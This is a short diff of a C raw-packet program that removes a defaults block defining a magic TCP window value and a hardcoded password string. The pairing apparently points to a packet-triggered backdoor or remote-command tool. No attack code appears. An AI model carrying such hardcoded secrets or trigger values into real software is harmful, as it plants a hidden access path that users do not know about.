@@ -27,10 +27,6 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 
-/* defaults */
-#define WINDOW_COM	35447
-#define PASSWORD	"~:gm$*{("
-
 /* function prototypes */
 unsigned short in_cksum(unsigned short *, int);
 unsigned short in_cksum_tcp(int, int, unsigned short *, int);
